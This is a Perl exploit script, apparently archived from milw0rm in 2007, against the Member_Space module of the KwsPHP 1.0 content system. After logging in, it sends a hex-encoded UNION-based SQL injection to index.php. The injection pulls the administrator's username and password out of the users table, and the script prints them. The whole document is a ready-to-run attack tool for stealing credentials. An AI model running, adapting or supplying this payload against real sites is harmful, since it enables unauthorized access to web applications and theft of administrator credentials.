<html><head><title>KwsPHP 1.0 Member_Space Module SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Cookies;

$host = $ARGV[0];
$User = $ARGV[1];
$passwd = $ARGV[2];
$url = &quot;http://&quot;.$host;
$port = &quot;80&quot;;

 print q(
################################################################
#  Script....................: KwsPHP v1.0 Member_Space Module #
#  Script Site...............: http://kws.koogar.org/          #
#  Vulnerability.............: Remote SQL injection Exploit    #
#  Access....................: Remote                          #
#  level.....................: Dangerous                       #
#  Author....................: S4mi                            #
#  Contact...................: S4mi[at]LinuxMail.org           #
#        This Exploit Work Only When magic_quotes_gpc Is OFF   #
################### (C)oded By S4mi ############################

);


 if (@ARGV &lt; 3) {
 print &quot; #  usage : xpl.pl   host/path/     User Passwd\n&quot;;
 print &quot; #    e.g : xpl.pl 127.0.0.1/KwsPHP/ zaz luks\n&quot;;
 exit();
 }

   print &quot; [~] User/Password : $User/$passwd \n&quot;;
   print &quot; [~] Host : $url \n&quot;;

 $xpl = LWP::UserAgent-&gt;new() or die;
 $cookie_jar = HTTP::Cookies-&gt;new();
 print &quot; [~] Logining ...\n&quot;;
 $xpl-&gt;cookie_jar( $cookie_jar );
 $login = $xpl-&gt;post($url.'index.php',
 Content =&gt; [
 &quot;pseudo&quot; =&gt; &quot;$User&quot;,
 &quot;pass&quot; =&gt; &quot;$passwd&quot;,
 &quot;submit&quot; =&gt; &quot;Se connecter&quot;,
 ],); 
 
$evil0 = &quot;\x39\x39\x39\x39\x39\x27\x2F\x2A\x2A\x2F\x55\x4E\x49\x4F\x4E&quot;
		.&quot;\x2F\x2A\x2A\x2F\x53\x45\x4C\x45\x43\x54\x2F\x2A\x2A\x2F\x6E&quot;
		.&quot;\x75\x6C\x6C\x2C\x63\x6F\x6E\x63\x61\x74\x28\x63\x68\x61\x72&quot;
		.&quot;\x28\x31\x31\x37\x2C\x31\x31\x35\x2C\x31\x30\x31\x2C\x31\x31&quot;
		.&quot;\x34\x2C\x31\x31\x30\x2C\x39\x37\x2C\x31\x30\x39\x2C\x31\x30&quot;
		.&quot;\x31\x2C\x35\x38\x29\x2C\x70\x73\x65\x75\x64\x6F\x2C\x63\x68&quot;
		.&quot;\x61\x72\x28\x31\x32\x37\x29\x29\x2C\x63\x6F\x6E\x63\x61\x74&quot;
		.&quot;\x28\x63\x68\x61\x72\x28\x31\x31\x32\x2C\x39\x37\x2C\x31\x31&quot;
		.&quot;\x35\x2C\x31\x31\x35\x2C\x31\x31\x39\x2C\x31\x31\x31\x2C\x31&quot;
		.&quot;\x31\x34\x2C\x31\x30\x30\x2C\x35\x38\x29\x2C\x70\x61\x73\x73&quot;
		.&quot;\x2C\x63\x68\x61\x72\x28\x31\x32\x37\x29\x29\x2C\x6E\x75\x6C&quot;
		.&quot;\x6C\x2F\x2A\x2A\x2F\x46\x52\x4F\x4D\x2F\x2A\x2A\x2F\x75\x73&quot;
		.&quot;\x65\x72\x73\x2F\x2A\x2A\x2F\x57\x48\x45\x52\x45\x2F\x2A\x2A&quot;
		.&quot;\x2F\x69\x64\x3D\x31\x2F\x2A&quot;;

$offset = &quot;\x65\x73\x70\x61\x63\x65\x5F\x6D\x65\x6D\x62\x72\x65\x26\x61&quot;
		 .&quot;\x63\x3D\x63\x61\x72\x6E\x65\x74\x26\x61\x63\x74\x3D\x65\x64&quot;
		 .&quot;\x69\x74\x65\x72\x26\x69\x64\x3D&quot;;

$target = $xpl-&gt;get($url.&quot;index.php?mod=$offset$evil0&quot;);



if($target-&gt;as_string =~ /value=&quot;username:(.*?&quot;/) {
$zaz = $1;
print &quot; [+] Exploit succeed! Getting admin information. \n&quot;;
print &quot; [+] ------------------------------------------- \n&quot;;
}
if($target-&gt;as_string =~ /value=&quot;password:(.*?&quot;/) {
$luks = $1;
print &quot; [+] UserName : $zaz \n&quot;;
print &quot; [+] Password : $luks \n&quot;;
}
else {
print &quot; [-] Exploit Failed ! \n&quot;;
}
print &quot;\n#############################################################\n&quot;;

# milw0rm.com [2007-09-15]</pre></html>